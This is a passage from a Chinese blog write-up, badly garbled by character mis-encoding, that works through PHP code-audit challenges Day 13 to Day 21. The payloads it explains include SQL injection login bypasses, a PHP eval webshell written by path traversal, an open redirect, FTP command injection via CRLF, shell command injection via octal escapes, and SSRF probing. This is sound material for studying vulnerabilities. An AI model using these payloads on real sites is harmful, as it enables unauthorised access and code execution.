<p>è¿™æ˜¯æ®µç™»å½•è®¤è¯ä»£ç ï¼Œé€šè¿‡POSTä¼ å…¥userå’Œpasswdå‚æ•°ï¼Œç„¶åé€šè¿‡<code>isValid</code>å‡½æ•°éªŒè¯åˆæ³•æ€§ã€‚åœ¨è¯¥å‡½æ•°å†…ï¼Œuserå’Œpasswordå˜é‡éƒ½ä¼šç»è¿‡<code>sanitizeInput</code>å‡½æ•°å¤„ç†åå†å¸¦å…¥sqlè¯­å¥æ‰§è¡Œã€‚</p>
<p>çœ‹ä¸€ä¸‹<code>sanitizeInput</code>æ˜¯æ€ä¹ˆå¤„ç†çš„ï¼Œå…ˆä½¿ç”¨<code>addslashes</code>å¤„ç†ï¼Œç„¶åé™åˆ¶é•¿åº¦ï¼Œè¶…è¿‡20å°±æˆªå–å‰20å­—ç¬¦ã€‚</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.addslashes.php">addslashes</a> â€” ä½¿ç”¨åæ–œçº¿å¼•ç”¨å­—ç¬¦ä¸²</p>
<pre><code>string addslashes ( string $str )</code></pre>
<p>ä½œç”¨ï¼šåœ¨å•å¼•å·ï¼ˆâ€™ï¼‰ã€åŒå¼•å·ï¼ˆâ€ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ä¸ NULï¼ˆ <strong>NULL</strong> å­—ç¬¦ï¼‰å­—ç¬¦ä¹‹å‰åŠ ä¸Šåæ–œçº¿ã€‚</p>
</blockquote>
<p>æŒ‰è¯´æŠŠå¼•å·éƒ½è½¬ä¹‰äº†å°±ä¸ç”¨å¼•å‘æ³¨å…¥äº†ï¼Œä½†æ˜¯åˆ©ç”¨substrå‡½æ•°ï¼Œåœ¨<code>\</code>å’Œ<code>&#39;</code>ä¹‹é—´æˆªå–ï¼Œåˆ©ç”¨\è½¬ä¹‰sqlè¯­å¥ä¸­åŸæœ¬ç”¨æ¥åŒ…è£¹<code>$user</code>çš„åå•å¼•å·ï¼Œèµ·åˆ°å¦‚ä¸‹æ•ˆæœï¼š</p>
<pre><code class="php">select count(p) from user u where user = &#39;1234567890123456789\&#39; AND password = &#39;$pass&#39;</code></pre>
<p>ç„¶åè®©user=<code>or 1=1#</code>ï¼Œsqlè¯­å¥å°±å˜æˆäº†ï¼š</p>
<pre><code class="php">select count(p) from user where user = &#39;1234567890123456789\&#39; AND password = &#39;or 1=1#&#39;</code></pre>
<p>æ­¤æˆ‘ä»¬å¯ä»¥ä¿è¯å¸¦å…¥æ•°æ®åº“æ‰§è¡Œçš„ç»“æœä¸º <strong>True</strong> ï¼Œç„¶åå°±èƒ½å¤Ÿé¡ºåˆ©åœ°é€šè¿‡éªŒè¯ã€‚</p>
<h2 id="Day-14-Snowman"><a href="#Day-14-Snowman" class="headerlink" title="Day 14 - Snowman"></a>Day 14 - Snowman</h2><p><strong>code:</strong></p>
<pre><code class="php">class Carrot &#123;
    const EXTERNAL_DIRECTORY = &#39;/tmp/&#39;;
    private $id;
    private $lost = 0;
    private $bought = 0;

    public function __construct($input) &#123;
        $this-&gt;id = rand(1, 1000);

        foreach ($input as $field =&gt; $count) &#123;
            $this-&gt;$field = $count++;
        &#125;
    &#125;

    public function __destruct() &#123;
        file_put_contents(
            self::EXTERNAL_DIRECTORY . $this-&gt;id,
            var_export(get_object_vars($this), true)
        );
    &#125;
&#125;

$carrot = new Carrot($_GET);</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>ä»»æ„æ–‡ä»¶å†™ï¼Œå¯ä»¥å¯¼è‡´getshellã€‚è¿™é‡Œ<code>$this-&gt;$field = $count++;</code>ï¼Œç”±äºã€<code>a++</code>å’Œ<code>++a</code>çš„å·®åˆ«ï¼Œè¿™é‡Œ<code>$field</code>ä»æ˜¯<code>$count</code>çš„å€¼ï¼ŒåŒæ—¶<code>$this-&gt;$field</code>å¯ä»¥ä¿®æ”¹ç±»çš„ä»»ä½•å±æ€§é€ æˆäº†å˜é‡è¦†ç›–ã€‚ä¾‹å¦‚ï¼š<code>id=../../../../var/www/html/shell.php</code>ã€‚å°±æ§åˆ¶äº†å†™æ–‡ä»¶çš„è·¯å¾„ã€‚</p>
<p>å†å°±æ˜¯å†™å…¥æ–‡ä»¶çš„å†…å®¹ï¼Œ<code>var_export(get_object_vars($this), true)</code>ï¼Œä½œç”¨æ˜¯å°†ç±»ä¸­å„å±æ€§è½¬æ¢æˆæ•°ç»„ç„¶åå†è½¬æˆå­—ç¬¦ä¸²å½¢å¼ã€‚</p>
<blockquote>
<p>get_object_vars â€” è¿”å›ç”±å¯¹è±¡å±æ€§ç»„æˆçš„å…³è”æ•°ç»„</p>
<p>var_export â€” è¾“å‡ºæˆ–è¿”å›ä¸€ä¸ªå˜é‡çš„å­—ç¬¦ä¸²è¡¨ç¤º</p>
</blockquote>
<p>è¿™æ ·ä¸€æ¥ï¼Œå…¨éƒ¨çš„å±æ€§éƒ½ä¼šè¾“å‡ºï¼Œè€Œä¸”è¿™ä¸ªè¿‡ç¨‹æ²¡æœ‰è½¬ä¹‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ æ–°çš„å±æ€§è¿›è¡Œå†™å…¥ã€‚</p>
<p>é€šè¿‡é—­åˆæ•°ç»„æˆ–è€…å°†shellå†…å®¹ç”¨<code>&quot;</code>åŒ…è£¹èµ·æ¥è¾¾åˆ°ç›®çš„ã€‚</p>
<pre><code class="php">payload1:
shell=&quot;&lt;?php eval($_POST[xx]); ?&gt;&quot;
string(131) &quot;array (
  &#39;id&#39; =&gt; &#39;../../../var/www/html/shell.php&#39;,
  &#39;lost&#39; =&gt; 0,
  &#39;bought&#39; =&gt; 0,
  &#39;shell&#39; =&gt; &#39;&quot;&lt;?php eval($_POST[xx]); ?&gt;&quot;&#39;,
)&quot;

payload2:
shell=&#39;,),&lt;?php phpinfo(); ?&gt;//
string(129) &quot;array (
  &#39;id&#39; =&gt; &#39;../../../var/www/html/shell.php&#39;,
  &#39;lost&#39; =&gt; 0,
  &#39;bought&#39; =&gt; 0,
  &#39;shell&#39; =&gt; &#39;\&#39;,),&lt;?php phpinfo(); ?&gt;//&#39;,
)&quot;</code></pre>
<p>å¦‚æœæŒ‰ç…§å¼€å‘è€…åŸæœ¬æ„æ€è¿›è¡Œè‡ªå¢æ“ä½œï¼Œå˜ä¸º<code>++$count</code>ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„ã€‚</p>
<pre><code class="php">$test = 123; echo ++$test;      // 124
$test = &#39;123&#39;; echo ++$test;    // 124
$test = &#39;1ab&#39;; echo ++$test;    // &#39;1ac&#39;
$test = &#39;ab1&#39;; echo ++$test;    // &#39;ab2&#39;
$test = &#39;a1b&#39;; echo ++$test;    // &#39;a1c&#39;
$test =array(2,&#39;name&#39;=&gt;&#39;wyj&#39;); echo ++$test;    //Array123</code></pre>
<p>é€šè¿‡åˆ†æå‘ç°ï¼Œåœ¨è¿›è¡Œ<code>++</code>æ“ä½œæ—¶ä¼šè¿›è¡Œéšå¼ç±»å‹è½¬æ¢ï¼Œå¦‚æœèƒ½å¤Ÿè½¬æ¢æˆåŠŸï¼Œåˆ™ä¼šè¿›è¡ŒåŠ æ³•æ“ä½œï¼›å¦‚æœä¸èƒ½è½¬æ¢æˆåŠŸï¼Œåˆ™å°†æœ€åä¸€ä¸ªå­—ç¬¦è¿›è¡ŒåŠ æ³•æ“ä½œã€‚<br>payloadå˜ä¸ºï¼š</p>
<pre><code class="php">id=../../var/www/html/test/shell.php4
or
id=../../var/www/html/test/shell.pho</code></pre>
<h2 id="Day-15-Sleigh-Ride"><a href="#Day-15-Sleigh-Ride" class="headerlink" title="Day 15 - Sleigh Ride"></a>Day 15 - Sleigh Ride</h2><p><strong>code:</strong></p>
<pre><code class="php">class Redirect &#123;
    private $websiteHost = &#39;www.vulnspy.com&#39;;

    private function setHeaders($url) &#123;
        $url = urldecode($url);
        header(&quot;Location: $url&quot;);
    &#125;

    public function startRedirect($params) &#123;
        $parts = explode(&#39;/&#39;, $_SERVER[&#39;PHP_SELF&#39;]);
        $baseFile = end($parts);
        $url = sprintf(
            &quot;%s?%s&quot;,
            $baseFile,
            http_build_query($params)
        );
        $this-&gt;setHeaders($url);
    &#125;
&#125;

if ($_GET[&#39;redirect&#39;]) &#123;
    (new Redirect())-&gt;startRedirect($_GET[&#39;params&#39;]);
&#125;</code></pre>
<p>è¿™ä¸€å…³ä¸»è¦è€ƒå¯Ÿçš„æ˜¯ <code>$_SERVER[&#39;PHP_SELF&#39;]</code> å¼•å‘çš„ä¸€ä¸ªä»»æ„ç½‘å€è·³è½¬æ¼æ´</p>
<p>é¦–å…ˆï¼Œåˆ†æä¸€ä¸‹ç¨‹åºçš„è¿è¡Œ</p>
<ul>
<li>å¦‚æœæœ‰ <code>$_GET[&#39;redirect&#39;]</code> å‚æ•°ï¼Œé‚£ä¹ˆå°± New ä¸€ä¸ª <code>Redirect</code> å¯¹è±¡ï¼ŒåŒæ—¶è°ƒç”¨ <code>Redirect</code> ç±»çš„ <code>startRedirect</code> æ–¹æ³•</li>
<li><code>startRedirect</code> å‡½æ•°æ¥å—ä¸€ä¸ª <strong>GET</strong> ç±»å‹çš„ <strong>params</strong> å‚æ•°ï¼Œç„¶ååœ¨ <code>explode()</code> å‡½æ•°ä¸­ï¼Œå°† <code>$_SERVER[&#39;PHP_SELF&#39;]</code> å¾—åˆ°çš„å€¼ï¼Œä»¥ <strong>/</strong> åˆ†å‰²æˆä¸€ä¸ª <code>$parts</code> æ•°ç»„ã€‚</li>
<li><code>$baseFile</code> çš„å€¼ä¸º <strong>$parts</strong> æ•°ç»„çš„æœ€åä¸€ä¸ªå€¼</li>
<li><strong>$url</strong> çš„å€¼ä¸º <code>$baseFile?http_build_query($params)</code> ï¼Œå…¶ä¸­çš„ <strong>http_build_query()</strong> å‡½æ•°å°±æ˜¯ä¸€ä¸ªå°†å‚æ•°è¿›è¡ŒURLç¼–ç çš„ä¸€ä¸ªæ“ä½œï¼Œæ¯”å¦‚ <strong>$params=â€™test=123â€™</strong></li>
<li>ç„¶åè°ƒç”¨ <strong>setHeaders</strong> å‡½æ•°ï¼Œé¦–å…ˆè§£ç  <strong>$url</strong> å‚æ•°ï¼Œç„¶å <strong>header()</strong> å‡½æ•°ç›´æ¥è·³è½¬ <strong>$url</strong></li>
</ul>
<p><strong>$_SERVER[â€˜PHPâ€™]</strong> å­˜åœ¨çš„é—®é¢˜ï¼š</p>
<p>åˆçœ‹è¿™ä¸ªç¨‹åºæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯PHPè‡ªå¸¦çš„*<em>$_SERVER[â€˜PHP_SELFâ€™]** å‚æ•°æ˜¯å¯ä»¥æ§åˆ¶çš„ã€‚å…¶ä¸­ <strong>PHP_SELF</strong> æŒ‡å½“å‰çš„é¡µé¢ç»å¯¹åœ°å€ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„ç½‘ç«™ï¼š*<em><a href="http://www.test.com/redict/index.php/">http://www.test.com/redict/index.php\</a></em></em>ï¼Œé‚£ä¹ˆ*<em>PHP_SELF** å°±æ˜¯ <strong>/redict/index.php</strong> ã€‚ä½†æœ‰ä¸ªå°é—®é¢˜å¾ˆå¤šäººæ²¡æœ‰æ³¨æ„åˆ°ï¼Œå½“<strong>URL</strong>æ˜¯<strong>PATH_INFO</strong>çš„æ—¶å€™ï¼Œæ¯”å¦‚ï¼š*<em><a href="http://www.test.com/redict/index.php/admin/">http://www.test.com/redict/index.php/admin\</a></em></em>ï¼Œé‚£ä¹ˆ*<em>PHP_SELF*</em>å°±æ˜¯**/redict/index.php/admin** ä¹Ÿå°±æ˜¯è¯´ï¼Œå…¶å® <strong>PHP_SELF</strong> æœ‰ä¸€éƒ¨åˆ†æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ã€‚</p>
<p>åŒç¼–ç é—®é¢˜ï¼š</p>
<p>URLæœ¬æ¥æ˜¯è¢«æµè§ˆå™¨ç¼–ç è¿‡ä¸€æ¬¡ï¼ŒæœåŠ¡å™¨æ¥æ”¶åˆ°æ¥è‡ªæµè§ˆå™¨URLè¯·æ±‚çš„æ—¶å€™ï¼Œä¼šå°†URLè§£ç ä¸€æ¬¡ï¼Œç”±äºåœ¨ç¨‹åºä¸­æˆ‘ä»¬çœ‹åˆ°æœ‰ <strong>urldecode()</strong> å‡½æ•°å­˜åœ¨ï¼Œå®ƒä¼šå†æ¬¡è§£ç ä¸€æ¬¡URLï¼Œæ­¤æ—¶åŒç¼–ç URLå°±å¯ä»¥åˆ©ç”¨ï¼Œç”¨äºç»•è¿‡æŸäº›å…³é”®è¯æ£€æµ‹ã€‚æ¯”å¦‚å°† <strong>/</strong> ç¼–ç ä¸ºï¼š <strong>%252f</strong></p>
<p>Payload:</p>
<pre><code>http://www.test.com/index.php/http:%252f%252flanvnal.com?redirect=test&amp;params=test123 </code></pre>
<blockquote>
<p><a href="https://xz.aliyun.com/t/3057">https://xz.aliyun.com/t/3057</a></p>
</blockquote>
<h2 id="Day-16-Poem"><a href="#Day-16-Poem" class="headerlink" title="Day 16 - Poem"></a>Day 16 - Poem</h2><p><strong>code:</strong></p>
<pre><code class="php">class FTP &#123;
    public $sock;

    public function __construct($host, $port, $user, $pass) &#123;
        $this-&gt;sock = fsockopen($host, $port);

        $this-&gt;login($user, $pass);
        $this-&gt;cleanInput();
        $this-&gt;mode($_REQUEST[&#39;mode&#39;]);
        $this-&gt;send($_FILES[&#39;file&#39;]);
    &#125;

    private function cleanInput() &#123;
        array_filter($_GET, &#39;intval&#39;);
        array_filter($_POST, &#39;intval&#39;);
        array_filter($_COOKIE, &#39;intval&#39;);
    &#125;

    public function login($username, $password) &#123;
        fwrite($this-&gt;sock, &quot;USER &quot; . $username);
        fwrite($this-&gt;sock, &quot;PASS &quot; . $password);
    &#125;

    public function mode($mode) &#123;
        if ($mode == 1 || $mode == 2 || $mode == 3) &#123;
            fputs($this-&gt;sock, &quot;MODE $mode&quot;);
        &#125;
    &#125;

    public function send($data) &#123;
        fputs($this-&gt;sock, $data);
    &#125;
&#125;

new FTP(&#39;localhost&#39;, 21, &#39;user&#39;, &#39;password&#39;);</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>è™½ç„¶ä½¿ç”¨äº†<code>cleanInput</code>å‡½æ•°è¿‡æ»¤äº†<code>$GET,$POST,$COOKIE</code>ï¼Œå°†ä»–ä»¬å¼ºåˆ¶è½¬æˆæ•´å‹æ•°æ®ã€‚ä½†æ˜¯åé¢å´ä¼ å…¥äº†ä¸€ä¸ªä» REQUESTæ–¹å¼è·å–çš„ modeå˜é‡ã€‚</p>
<blockquote>
<p>è¶…å…¨å±€æ•°ç»„ <strong>$_REQUEST</strong> ä¸­çš„æ•°æ®ï¼Œæ˜¯ <strong>$_GET</strong> ã€ <strong>$_POST</strong> ã€ <strong>$_COOKIE</strong> çš„åˆé›†ï¼Œè€Œä¸”æ•°æ®æ˜¯å¤åˆ¶è¿‡å»çš„ï¼Œå¹¶ä¸æ˜¯å¼•ç”¨ã€‚</p>
</blockquote>
<p>æ‰€ä»¥ REQUEST æ•°æ®ä¸æ¯«ä¸å—è¿‡æ»¤å‡½æ•°çš„å½±å“ï¼Œæœ€åè¿‡æ»¤æ²¡èµ·åˆ°ä»»ä½•ä½œç”¨ã€‚è€Œä¸”ç¬¬21è¡Œæ¯”è¾ƒä½¿ç”¨çš„<code>==</code>å¼±æ¯”è¾ƒï¼Œä½¿ç”¨payloadï¼š<code>**?mode=1%0a%0dDELETE%20test.php** </code></p>
<h2 id="Day-17-Mistletoe"><a href="#Day-17-Mistletoe" class="headerlink" title="Day 17 - Mistletoe"></a>Day 17 - Mistletoe</h2><p><strong>code:</strong></p>
<pre><code class="php">class RealSecureLoginManager &#123;
    private $em;
    private $user;
    private $password;

    public function __construct($user, $password) &#123;
        $this-&gt;em = DoctrineManager::getEntityManager();
        $this-&gt;user = $user;
        $this-&gt;password = $password;
    &#125;

    public function isValid() &#123;
        $pass = md5($this-&gt;password, true);
        $user = $this-&gt;sanitizeInput($this-&gt;user);

        $queryBuilder = $this-&gt;em-&gt;createQueryBuilder()
            -&gt;select(&quot;COUNT(p)&quot;)
            -&gt;from(&quot;User&quot;, &quot;u&quot;)
            -&gt;where(&quot;password = &#39;$pass&#39; AND user = &#39;$user&#39;&quot;);
        $query = $queryBuilder-&gt;getQuery();
        return boolval($query-&gt;getSingleScalarResult());
    &#125;

    public function sanitizeInput($input) &#123;
        return addslashes($input);
    &#125;
&#125;

$auth = new RealSecureLoginManager(
    $_POST[&#39;user&#39;],
    $_POST[&#39;passwd&#39;]
);
if (!$auth-&gt;isValid()) &#123;
    exit;
&#125;</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>è¿™é“é¢˜ç›®æ˜¯ç¬¬13é¢˜çš„å‡çº§ç‰ˆæœ¬ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨13é¢˜ä¸­ä¸»è¦æ˜¯åˆ©ç”¨äº†<code>addslashes</code>å’Œå­—ç¬¦ä¸²æˆªæ–­çš„æ–¹å¼æ‰€é€ æˆçš„<code>\</code>é€ƒé€¸ä»è€Œå½¢æˆçš„æ³¨å…¥ã€‚æœ¬é¢˜æœ€ç»ˆçš„ç›®çš„è¿˜æ˜¯å½¢æˆSQLæ³¨å…¥ä»è€Œè¿›è¡Œä»»æ„è´¦æˆ·ç™»å½•ã€‚æœ¬é¢˜çš„å…³é”®é—®é¢˜æ˜¯åœ¨äº<code>md5($this-&gt;password, true);</code></p>
<blockquote>
<p>md5 â€” è®¡ç®—å­—ç¬¦ä¸²çš„ MD5 æ•£åˆ—å€¼</p>
<p>string md5 ( string <code>$str</code> [, bool <code>$raw_output</code> = false ] )</p>
<p>raw_output</p>
<p>å¦‚æœå¯é€‰çš„ <code>raw_output</code> è¢«è®¾ç½®ä¸º **<code>TRUE</code>**ï¼Œé‚£ä¹ˆ MD5 æŠ¥æ–‡æ‘˜è¦å°†ä»¥16å­—èŠ‚é•¿åº¦çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼è¿”å›ã€‚</p>
</blockquote>
<p>eg:</p>
<pre><code class="php">php &gt; var_dump(md5(&#39;1&#39;));
string(32) &quot;c4ca4238a0b923820dcc509a6f75849b&quot;
php &gt; var_dump(md5(&#39;1&#39;,true));
ï¿½Pï¿½ouï¿½ï¿½&quot;6) &quot;ï¿½ï¿½B8ï¿½ï¿½#ï¿½</code></pre>
<p>å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿è¯æœ€åç»è¿‡<code>md5($this-&gt;password, true);</code>æœ€åçš„å­—ç¬¦ä¸²æ˜¯<code>\</code>ï¼Œé‚£ä¹ˆå°±å’ŒDay13ä¸€æ ·çš„æ•ˆæœï¼Œèƒ½ç»•è¿‡ç™»å½•éªŒè¯ï¼Œé€šè¿‡fuzzï¼Œæˆ‘ä»¬å‘ç°<code>md5(128,true)</code>å¾—åˆ°çš„æ˜¯<code>vï¿½anï¿½ï¿½ï¿½lï¿½ï¿½ï¿½qï¿½ï¿½\</code>ã€‚</p>
<p>payloadä¸º<code>passwd=128&amp;user=&#39; or 1=1#</code></p>
<h2 id="Day-18-Sign"><a href="#Day-18-Sign" class="headerlink" title="Day 18 - Sign"></a>Day 18 - Sign</h2><p><strong>codeï¼š</strong></p>
<pre><code class="php">class JWT &#123;
    public function verifyToken($data, $signature) &#123;
        $pub = openssl_pkey_get_public(&quot;file://pub_key.pem&quot;);
        $signature = base64_decode($signature);
        if (openssl_verify($data, $signature, $pub)) &#123;
            $object = json_decode(base64_decode($data));
            $this-&gt;loginAsUser($object);
        &#125;
    &#125;
&#125;

(new JWT())-&gt;verifyToken($_GET[&#39;d&#39;], $_GET[&#39;s&#39;]);</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>é—®é¢˜å‡ºåœ¨<code>openssl_verify</code>çš„é”™è¯¯ä½¿ç”¨ã€‚</p>
<blockquote>
<p>int openssl_verify ( string <code>$data</code> , string <code>$signature</code> , <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$pub_key_id</code> [, <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$signature_alg</code> = OPENSSL_ALGO_SHA1 ] )</p>
<p><strong>openssl_verify()</strong> verifies that the <code>signature</code> is correct for the specified <code>data</code> using the public key associated with <code>pub_key_id</code>. This must be the public key corresponding to the private key used for signing.</p>
<p><strong>è¿”å›å€¼</strong></p>
<p>Returns 1 if the signature is correct, 0 if it is incorrect, and -1 on error.</p>
</blockquote>
<p>é”™è¯¯çš„æƒ…å†µè¿”å›<code>-1</code>ï¼Œè¿™æ ·çš„è¯å°±é€šè¿‡ifåˆ¤æ–­äº†ï¼Œå› ä¸ºifåªåœ¨é‡åˆ°<code>0</code>æˆ–è€…æ˜¯<code>false</code>è¿”å›çš„æ‰æ˜¯<code>false</code>ï¼Œé‚£ä¹ˆåªè¦è®©ä»–å‡ºé”™å°±èƒ½ç»•è¿‡éªŒè¯ã€‚å¦‚æœè®©<code>openssl_verify()</code>å‡ºé”™å‘¢ï¼Ÿæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªå…¶ä»–çš„<code>pub_key.pem</code>æ¥ç”Ÿæˆ<code>data</code>å’Œ<code>signature</code>,è¿™æ ·å°±å¯ä»¥ä½¿å¾—<code>openssl_verify()</code>è¿”å›-1ã€‚</p>
<h2 id="Day-19-Birch"><a href="#Day-19-Birch" class="headerlink" title="Day 19 - Birch"></a>Day 19 - Birch</h2><p><strong>codeï¼š</strong></p>
<pre><code class="php">class ImageViewer &#123;
    private $file;

    function __construct($file) &#123;
        $this-&gt;file = &quot;images/$file&quot;;
        $this-&gt;createThumbnail();
    &#125;

    function createThumbnail() &#123;
        $e = stripcslashes(
            preg_replace(
                &#39;/[^0-9\\\]/&#39;,
                &#39;&#39;,
                isset($_GET[&#39;size&#39;]) ? $_GET[&#39;size&#39;] : &#39;25&#39;
            )
        );
        system(&quot;/usr/bin/convert &#123;$this-&gt;file&#125; --resize $e
                ./thumbs/&#123;$this-&gt;file&#125;&quot;);
    &#125;

    function __toString() &#123;
        return &quot;&lt;a href=&#123;$this-&gt;file&#125;&gt;
                &lt;img src=./thumbs/&#123;$this-&gt;file&#125;&gt;&lt;/a&gt;&quot;;
    &#125;
&#125;

echo (new ImageViewer(&quot;image.png&quot;));</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>é—®é¢˜å‡ºåœ¨<code>stripcslashes</code>å‡½æ•°ï¼Œçœ‹ä¸€ä¸‹PHPæ‰‹å†Œä¸­çš„ä»‹ç»ã€‚</p>
<blockquote>
<p><strong>stripcslashes</strong></p>
<p>stripcslashes â€” åå¼•ç”¨ä¸€ä¸ªä½¿ç”¨ <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/function.addcslashes.html">addcslashes()</a> è½¬ä¹‰çš„å­—ç¬¦ä¸²</p>
<p><strong>è¯´æ˜</strong></p>
<p>string stripcslashes ( string <code>$str</code> )</p>
<p>è¿”å›åè½¬ä¹‰åçš„å­—ç¬¦ä¸²ã€‚å¯è¯†åˆ«ç±»ä¼¼ C è¯­è¨€çš„ <em>\n</em>ï¼Œ<em>\r</em>ï¼Œâ€¦ å…«è¿›åˆ¶ä»¥åŠåå…­è¿›åˆ¶çš„æè¿°ã€‚</p>
</blockquote>
<p>PS:è¿˜æœ‰ä¸€ä¸ªç±»ä¼¼çš„å‡½æ•°<code>stripslashes</code></p>
<blockquote>
<p>åå¼•ç”¨ä¸€ä¸ªå¼•ç”¨å­—ç¬¦ä¸²ã€‚</p>
</blockquote>
<p>å·®åˆ«åœ¨äº<code>stripcslashes</code>ä¼šè½¬ä¹‰Cè¯­è¨€ä»¥åŠåè¿›åˆ¶å’Œ8è¿›åˆ¶ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="php">php &gt; var_dump(stripcslashes(&#39;\x30\x3b\x73\x6c\x65\x65\x70\x20\x35\x3b&#39;));
string(10) &quot;0;sleep 5;&quot;    //åå…­è¿›åˆ¶
php &gt; var_dump(stripcslashes(&#39;0\073\163\154\145\145\160\0405\073&#39;));
string(10) &quot;0;sleep 5;&quot;    //å…«è¿›åˆ¶</code></pre>
<p>æ­£åˆ™<code>/[^0-9\\\]/</code>é™åˆ¶äº†åªèƒ½ä½¿ç”¨æ•°å­—å’Œ<code>\</code>ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨å…«è¿›åˆ¶é…åˆ``stripcslashes<code>æ‹¼æ¥</code>/usr/bin/convert {$this-&gt;file} â€“resize $e`æ‰§è¡Œå‘½ä»¤ï¼Œé€ æˆå‘½ä»¤æ³¨å…¥æ¼æ´ã€‚</p>
<p>egï¼šä¼ å…¥ï¼š<code>size=0\073\163\154\145\145\160\0405\073</code></p>
<pre><code>/usr/bin/convert images/image.png --resize 0;sleep 5; ./thumbs/image.png</code></pre>
<h2 id="Day-20-Stocking"><a href="#Day-20-Stocking" class="headerlink" title="Day 20 - Stocking"></a>Day 20 - Stocking</h2><p><strong>code:</strong></p>
<pre><code class="php">set_error_handler(function ($no, $str, $file, $line) &#123;
    throw new ErrorException($str, 0, $no, $file, $line);
&#125;, E_ALL);

class ImageLoader
&#123;
    public function getResult($uri)
    &#123;
        if (!filter_var($uri, FILTER_VALIDATE_URL)) &#123;
            return &#39;&lt;p&gt;Please enter valid uri&lt;/p&gt;&#39;;
        &#125;

        try &#123;
            $image = file_get_contents($uri);
            $path = &quot;./images/&quot; . uniqid() . &#39;.jpg&#39;;
            file_put_contents($path, $image);
            if (mime_content_type($path) !== &#39;image/jpeg&#39;) &#123;
                unlink($path);
                return &#39;&lt;p&gt;Only .jpg files allowed&lt;/p&gt;&#39;;
            &#125;
        &#125; catch (Exception $e) &#123;
            return &#39;&lt;p&gt;There was an error: &#39; .
                $e-&gt;getMessage() . &#39;&lt;/p&gt;&#39;;
        &#125;

        return &#39;&lt;img src=&quot;&#39; . $path . &#39;&quot; width=&quot;100&quot;/&gt;&#39;;
    &#125;
&#125;

echo (new ImageLoader())-&gt;getResult($_GET[&#39;img&#39;]);</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>é—®é¢˜åœ¨äºæä¾›äº†é”™è¯¯æ˜¾ç¤ºï¼Œå¹¶ä¸”å°†é”™è¯¯è¾“å‡ºäº†å‡ºæ¥ã€‚å¯ä»¥åˆ©ç”¨é”™è¯¯ä¿¡æ¯çš„è¾“å‡ºè¿›è¡Œä¿¡æ¯æ¢æµ‹ã€‚</p>
<blockquote>
<p><code>set_error_handler(function ($no, $str, $file, $line) &#123; throw new ErrorException($str, 0, $no, $file, $line);&#125;, E_ALL);</code></p>
<p>è¿™ä¸ªå°±ç±»ä¼¼äºè®¾ç½®å¦‚ä¸‹çš„ä»£ç ï¼š</p>
<p><code>error_reporting(E_ALL);ini_set(&#39;display_errors&#39;, TRUE);ini_set(&#39;display_startup_errors&#39;, TRUE);</code></p>
<p>å¦‚æ­¤å°±ä¼šåŒ…å«æ‰€æœ‰çš„é”™è¯¯ä¿¡æ¯ã€‚åŠ ä¸Š<code>&#39;There was an error: &#39; .$e-&gt;getMessage() . &#39;&#39;</code>å°±å¯¼è‡´ä¼šåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºæ‰€æœ‰çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬warningä¿¡æ¯ã€‚</p>
</blockquote>
<p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœä½¿ç”¨<code>file_get_contents(&#39;http://127.0.0.1:80&#39;)</code>æ˜¾ç¤ºçš„ä»…ä»…åªæ˜¯<code>warningä¿¡æ¯</code>ï¼Œåœ¨æ­£å¸¸çš„PHPé¡µé¢ä¸­æ˜¯ä¸ä¼šæ˜¾ç¤ºwarningä¿¡æ¯çš„ã€‚ä½†æ˜¯åœ¨å¼€å¯äº†ä¸Šè¿°çš„é…ç½®ä¹‹åï¼Œæ‰€æœ‰çš„ä¿¡æ¯éƒ½ä¼šåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºã€‚è¿™æ ·å°±å¯¼è‡´æˆ‘ä»¬å¯ä»¥é€šè¿‡SSRFæ¥æ¢æµ‹å†…ç½‘çš„ç«¯å£å’ŒæœåŠ¡äº†ã€‚</p>
<h2 id="Day-21-Gift-Wrap"><a href="#Day-21-Gift-Wrap" class="headerlink" title="Day 21 - Gift Wrap"></a>Day 21 - Gift Wrap</h2><p><strong>code:</strong></p>
<pre><code class="php">declare(strict_types=1);

class ParamExtractor &#123;
    private $validIndices = [];

    private function indices($input) &#123;
        $validate = function (int $value, $key) &#123;
            if ($value &gt; 0) &#123;
                $this-&gt;validIndices[] = $key;
            &#125;
        &#125;;

        try &#123;
            array_walk($input, $validate, 0);
        &#125; catch (TypeError $error) &#123;
            echo &quot;Only numbers are allowed as input&quot;;
        &#125;

        return $this-&gt;validIndices;
    &#125;

    public function getCommand($parameters) &#123;
        $indices = $this-&gt;indices($parameters);
        $params = [];
        foreach ($indices as $index) &#123;
            $params[] = $parameters[$index];
        &#125;
        return implode($params, &#39; &#39;);
    &#125;
&#125;

$cmd = (new ParamExtractor())-&gt;getCommand($_GET[&#39;p&#39;]);
system(&#39;resizeImg image.png &#39; . $cmd);</code></pre>
<blockquote>
